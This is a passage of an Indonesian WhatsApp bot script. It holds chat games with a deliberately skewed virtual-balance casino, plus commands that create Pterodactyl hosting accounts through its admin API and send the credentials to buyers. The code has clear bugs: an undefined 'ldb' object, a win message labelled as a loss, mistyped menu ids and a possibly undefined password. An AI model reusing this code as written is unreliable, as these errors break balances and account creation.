}, 
mimetype: 'audio/mp4', 
fileName: `${title}`,
contextInfo: { 
externalAdReply: { 
showAdAttribution: true, 
renderLargerThumbnail: false,
mediaType:  1,
mediaUrl: url,
title: "RISKY OFC",
body: "RISKY OFC",
sourceUrl: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
thumbnail: await(await RezzHost.getFile(thumbnail)).data}}}
return RezzHost.sendMessage(m.chat, doc, { quoted: kalgans })
     
} catch (e) {
console.error(e);
m.reply(`Maaf, terjadi kesalahan dalam mencari lagu. 😔`);
}
} else {
}}
break

case 'totalfitur': {
m.reply(`${totalFitur()} Features`)
}
break

break

// game menu
case "tebakbomb": case "bomb": {
if (!m.isGroup) return m.reply(mess.group)
if (m.chat in RezzHost.bomb) return RezzHost.sendText(m.chat, "Masih ada game yang belum terselsaikan!", RezzHost.bomb[m.chat][0]);
RezzHost.bomb = RezzHost.bomb ? RezzHost.bomb : {};
let id = m.chat,
timeout = 180000;
const bom = ['💥', '✅', '✅', '✅', '✅', '✅', '✅', '✅', '✅'].sort(() => Math.random() - 0.5);
const number = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣'];
const array = bom.map((v, i) => ({
emot: v,
number: number[i],
position: i + 1,
state: false
}));
let teks = `*🎮 GAME TEBAK BOM 🎮*\n\nKirim angka *1* - *9* untuk membuka *9* kotak nomor di bawah ini :\n\n`;
for (let i = 0; i < array.length; i += 3) teks += array.slice(i, i + 3).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += `\nWaktu : *${((timeout / 1000) / 60)} menit*\nHadiah : *Random Balance*\n\nApabila mendapat kotak yang berisi bom maka *Hadiah* tidak di berikan`;
let msg = await RezzHost.sendText(m.chat, teks, RezzHost.bomb[id] ? RezzHost.bomb[id][0] : m);
let { key } = msg

let v;
RezzHost.bomb[id] = [
msg,
array,
setTimeout(() => {
v = array.find(v => v.emot == '💥');
if (RezzHost.bomb[id]) RezzHost.sendText(m.chat, `*Waktu habis*\n\nKotak yang berisi bom ${v.number} tidak terbuka\nGame dihentikan!`, RezzHost.bomb[id][0]);
delete RezzHost.bomb[id];
}, timeout),
key
];
}
break

case 'casino': {
if (!m.isGroup) return m.reply(mess.group)
let buatall = 1
RezzHost.casino = RezzHost.casino ? RezzHost.casino : {}
if (m.chat in RezzHost.casino) return m.reply('Masih Ada Yang Melakukan Casino Disini, Tunggu Sampai Selesai!!')
else RezzHost.casino[m.chat] = true
try {
let randomaku = `${Math.floor(Math.random() * 101)}`.trim()
let randomkamu = `${Math.floor(Math.random() * 81)}`.trim() //hehe Biar Susah Menang :v
let Aku = (randomaku * 1)
let Kamu = (randomkamu * 1)
let count = args[0]
count = count ? /all/i.test(count) ? Math.floor(db.data.users[m.sender].balance / buatall) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
count = Math.max(1, count)
if (args.length < 1) return m.reply(`${prefix}casino <jumlah>\n${prefix}casino 1000`)
if (db.data.users[m.sender].balance >= count * 1) {
db.data.users[m.sender].balance -= count * 1
if (Aku > Kamu) {
m.reply(`💰 Casino 💰\n*${pushname}:* ${Kamu} Point\n*${botname}:* ${Aku} Point\n\n*Kamu Kalah*\nKamu Kehilangan ${count} Balance`)
} else if (Aku < Kamu) {
db.data.users[m.sender].balance += count * 2
m.reply(`💰 Casino 💰\n*${pushname}:* ${Kamu} Point\n*${botname}:* ${Aku} Point\n\n*Kamu Kalah*\nKamu Mendapatkan ${count * 2} Balance`)
} else {
ldb.data.users[m.sender].balance += count * 1
m.reply(`💰 Casino 💰\n*${pushname}:* ${Kamu} Point\n*${botname}:* ${Aku} Point\n\n*Seri*\nKamu Mendapatkan ${count * 1} Balance`)
}
} else m.reply(`Balance Kamu Tidak Mencukupi Untuk Casino Silahkan *bermain game* Terlebih Dahulu!`)
} catch (e) {
console.log(e)
m.reply(mess.error)
} finally {
delete RezzHost.casino[m.chat]
}
}
break

case "suit": {
if (!m.isGroup) return m.reply(mess.group)
if (Object.values(suit).find(v => v.id.startsWith('suit') && [v.penantang, v.ditantang].includes(m.sender))) return m.reply(`Selesaikan dulu suit mu yang sebelumnya`)
if (m.quoted || text) {
if (froms === botNumber) return m.reply(`Tidak bisa bermain suit dengan bot!`)
if (froms === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri!`)
if (Object.values(suit).find(v => v.id.startsWith('suit') && [v.penantang, v.ditantang].includes(froms))) return m.reply(`Orang yang kamu tantang sedang bermain suit bersama orang lain`)
let hadiah = randomNumber(2000, 3000)
let timeout = 60 * 1000
let id = 'suit_' + Date.now()

suit[id] = {
id: id,
penantang: m.sender,
ditantang: froms,
status: 'WAIT',
hadiah: hadiah,
chat: await RezzHost.sendMessage(m.chat, {text: `*🎮 GAME SUIT 🎮*\n\n@${m.sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain suit\n\nKetik *Y atau N* untuk bermain\nY = menerima suit\nN = menolak suit\n\nHadiah : *$${hadiah}* balance`, contextInfo: {mentionedJid: [froms, m.sender]}}, {quoted: kalgans}),
timeout: timeout,
waktu: setTimeout(() => {
if (suit[id]) RezzHost.sendMessage(m.chat, {text: `Waktu habis! @${froms.split("@")[0]} tidak merespon suit\nGame dibatalkan!`, contextInfo: {mentionedJid: [froms]}}, {quoted: suit[id].chat})
delete suit[id]
}, timeout)
}
} else m.reply('@tagtarget')
}
break

case 'slot': {
if (!m.isGroup) return m.reply(mess.group)
let hadiah = randomNumber(2000, 3000)
let emojis = ["😹", "🧢", "🗿"]
let a = Math.floor(Math.random() * emojis.length)
let b = Math.floor(Math.random() * emojis.length)
let c = Math.floor(Math.random() * emojis.length)
let x = [],
y = [],
z = []
for (let i = 0; i < 3; i++) {
x[i] = emojis[a]
a++
if (a == emojis.length) a = 0
}
for (let i = 0; i < 3; i++) {
y[i] = emojis[b]
b++
if (b == emojis.length) b = 0
}
for (let i = 0; i < 3; i++) {
z[i] = emojis[c]
c++
if (c == emojis.length) c = 0
}
let end
if (a == b && b == c) {
end = `JACKPOT! *$${hadiah} point*`
db.data.users[m.sender].balance += hadiah
} else if (a == b || a == c || b == c) {
end = `Hampir Beruntung! *+1 Limits*`
db.data.users[m.sender].limit += 1
} else {
end = `LOSE! *-$${hadiah}*`
if (hadiah > db.data.users[m.sender].balance) {
ldb.data.users[m.sender].balance = 0
} else {
db.data.users[m.sender].balance -= hadiah
}
}
let teks = `乂  *S L O T S*\n\n`
teks += `	[ ${x[0]} ${y[0]} ${z[0]} ]\n`
teks += `	[ ${x[1]} ${y[1]} ${z[1]} ]\n`
teks += `	[ ${x[2]} ${y[2]} ${z[2]} ]\n`
teks += `\n${end}`
m.reply(teks)
}
break
case 'tictactoe': case 'ttt': case 'ttc': case 'xox':
if (!m.isGroup) return m.reply(mess.group)
if (from in tictactoe) return m.reply(`Masih ada game yang blum selesai`)
if (!froms) return m.reply(`Kirim perintah *${command}* @tag atau reply pesan orangnya!`)
if (froms === botNumber) return m.reply(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return m.reply(`Sad amat main ama diri sendiri`)
var hadiah = randomNumber(10, 20)
await m.reply(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain TicTacToe\n\n*Kirim (Y/N)* untuk bermain\n\nHadiah : ${hadiah} balance`)
tictactoe[from] = {
id: from,
status: null,
hadiah: hadiah,
penantang: sender,
ditantang: froms,
TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
}
break
case 'delttt': case 'delttc':
if (!m.isGroup) return m.reply(mess.group)
if (!(from in tictactoe)) return m.reply(`Tidak ada sesi game tictactoe di grup ini`)
if (isAdmins || isOwner) {
delete tictactoe[from];
m.reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].penantang.includes(sender)) {
delete tictactoe[from];
m.reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].ditantang.includes(sender)) {
delete tictactoe[from];
m.reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else {
m.reply(`Anda tidak bisa menghapus sesi tictactoe karena bukan pemain!`)
}
break

//===PANEL MENU====//

case 'pesan-panel': case 'buy-panel': {
if (!args || !args[0]) return m.reply(`🚩 Please enter the message\nExample of Use: ${prefix + command} ${owner} pesan untuknya`)
let ngen = ['|']
if (args[0].includes(ngen)) return m.reply('Replace Symbol | So spaces')
if (args[0].length > 14) return m.reply('Extension Number')
if (args[0].length < 7) return m.reply('Abbreviation Number')
if (args[0].startsWith('0')) return reply('Use format 62')
if (!args[0]) return reply('Masukkan Teks')
let mention = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[0] ? (args[0].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
let txt = (args.length > 1 ? args.slice(1).join(' ') : '') || ''
let q = m.quoted ? m.quoted : m
let mime = (q.m || q).mimetype || ''
let tujuan = `*[ ADA YANG PESAN NIH ]*
*Nama :* ${pushname}
*Nomor :* ${m?.sender.split('@')[0]}
*Pesanan :* ${txt}
`
if (!m.quoted) {
RezzHost.sendText(mention, tujuan)
} else {
RezzHost.sendText(mention, tujuan)
let media = q ? await m.getQuotedObj() : false || m
await RezzHost.copyNForward(mention, media, false).catch(_ => _)
}
let suks = `
*PESANAN SUDAH DI KIRIM KE OWNER*
*Pesanan :* ${txt}
`
RezzHost.sendMessage(m.chat, { text: `${suks}`, mentions: [suks] }, { quoted: kalgans })

}
break
case "ramlist":
case "listram":
case "panel-menu": {
 
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
panel = `*[ LIST RAM PANEL ]*

1gb nama,nomor / tag
2gb nama,nomor / tag
3gb nama,nomor / tag
4gb nama,nomor / tag
5gb nama,nomor / tag
6gb nama,nomor / tag
7gb nama,nomor / tag
8gb nama,nomor / tag
9gb nama,nomor / tag
10gb nama,nomor / tag
11gb nama,nomor / tag
12gb nama,nomor / tag
13gb nama,nomor / tag
14gb nama,nomor / tag
15gb nama,nomor / tag
16gb nama,nomor / tag
17gb nama,nomor / tag
18gb nama,nomor / tag
19gb nama,nomor / tag
20gb nama,nomor / tag
21gb nama,nomor / tag
22gb nama,nomor / tag
23gb nama,nomor / tag
24gb nama,nomor / tag
25gb nama,nomor / tag
26gb nama,nomor / tag
27gb nama,nomor / tag
28gb nama,nomor / tag
29gb nama,nomor / tag
20gb nama,nomor / tag
unli nama,nomor / tag
`

let sections = [{
title: '<📮> LIST PANEL PETRODACTYL BY RISKY OFC',
highlight_label: 'PALING MURAH',
rows: [{
title: '1 GB CPU 300%',
description: `BUY PANEL 1 GB CPU 300%`, 
id: `.buy-panel ${owner} 1 GB CPU 300%`
},
{
title: '2 GB CPU 300%',
description: `BUY PANEL 2 GB CPU 300%`, 
id: `.buy-panel ${owner} 2 GB CPU 300%`
},
{
title: '3 GB CPU 150%',
description: `BUY PANEL 3 GB CPU 150%`, 
id: `.buy-panel ${owner} 3 GB CPU 150%`
},
{
title: '4 GB CPU 300%',
description: `BUY PANEL 4 GB CPU 300%`, 
id: `.buy-panel ${owner} 4 GB CPU 300%`
},
{
title: '5 GB CPU 250%',
description: `BUY PANEL 5 GB CPU 250%`, 
id: `.buy-panel ${owner} 5 GB CPU 250%`
},
{
title: '6 GB CPU 300%',
description: `BUY PANEL 6 GB CPU 300%`, 
id: `.buy-panel ${owner} 6 GB CPU 300%`
},
{
title: '7 GB CPU 350%',
description: `BUY PANEL 7 GB CPU 350%`, 
id: `.buy-panel ${owner} 7 GB CPU 350%`
},
{
title: '8 GB CPU 400%', 
description: "BUY PANEL 8 GB CPU 400%", 
id: `.buy-panel ${owner} 8 GB CPU 400%`
},
{
title: '9 GB CPU 850%', 
description: "BUY PANEL 9 GB CPU 450%", 
id: `.buy-panel ${owner} 9 GB CPU 450%`
},
{
title: '10 GB CPU 500%', 
description: "BUY PANEL 10 GB CPU 500%", 
id: `.buy-panel ${owner} 10 GB CPU 500%`
},
{
title: '11 GB CPU 550%', 
description: "BUY PANEL 11 GB CPU 550%", 
id: `.buy-panel ${owner} 11 GB CPU 550%`
},
{
title: '12 GB CPU 600%', 
description: "BUY PANEL 12 GB CPU 600%", 
id: `.buy-panel ${owner} 12 GB CPU 600%`
},
{
title: '13 GB CPU 650%', 
description: "BUY PANEL 13 GB CPU 650%", 
id: `.buy-panel ${owner} 13 GB CPU 650%`
},
{
title: '14 GB CPU 700%', 
description: "BUY PANEL 14 GB CPU 700%", 
id: `.buy-panel ${owner} 14 GB CPU 700%`
},
{
title: '15 GB CPU 750%', 
description: "BUY PANEL 15 GB CPU 750%", 
id: `.buy-panel ${owner} 15 GB CPU 750%`
},
{
title: '16 GB CPU 800%', 
description: "BUY PANEL 16 GB CPU 800%", 
id: `.buy-panel ${owner} 16 GB CPU 800%`
},
{
title: '17 GB CPU 850%', 
description: "BUY PANEL 17 GB CPU 850%", 
id: `.buy-panel ${owner} 17 GB CPU 850%`
},
{
title: '18 GB CPU 900%', 
description: "BUY PANEL 18 GB CPU 900%", 
id: `.buy-panel ${owner} 18 GB CPU 900%`
},
{
title: '19 GB CPU 950%', 
description: "BUY PANEL 19 GB CPU 950%", 
id: `.buy-panel ${owner} 12 GB CPU 950%`
},
{
title: '20 GB CPU 1000%', 
description: "BUY PANEL 20 GB CPU 1000%", 
id: `.buy-panel ${owner} 20 GB CPU 1000%`
},
{
title: '21 GB CPU 1050%', 
description: "BUY PANEL 21 GB CPU 1050%", 
id: `.buy-panel ${owner} 2q GB CPU 1050%`
},
{
title: '22 GB CPU 1100%', 
description: "BUY PANEL 22 GB CPU 1100%", 
id: `.buy-panel ${owner} 22 GB CPU 1100%`
},
{
title: '23 GB CPU 1150%', 
description: "BUY PANEL 23 GB CPU 1150%", 
id: `.buy-panel ${owner} 23 GB CPU 1150%`
},
{
title: '24 GB CPU 1200%', 
description: "BUY PANEL 24 GB CPU 1200%", 
id: `.buy-panel ${owner} 24 GB CPU 1200%`
},
{
title: '25 GB CPU 1000%', 
description: "BUY PANEL 25 GB CPU 1250%", 
id: `.buy-panel ${owner} 25 GB CPU 1250%`
},
]
}]

let listMessage = {
    title: 'LIST PANEL PETRODACTYL', 
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: wm, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: wm
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by InzieOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: panel,
 subtitle: wm,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case "1gb": case 'panel1gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1050"
let cpu = "100"
let disk = "1050"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "2gb": case 'panel2gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2050"
let cpu = "200"
let disk = "2050"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "3gb": case 'panel3gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3050"
let cpu = "300"
let disk = "3050"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
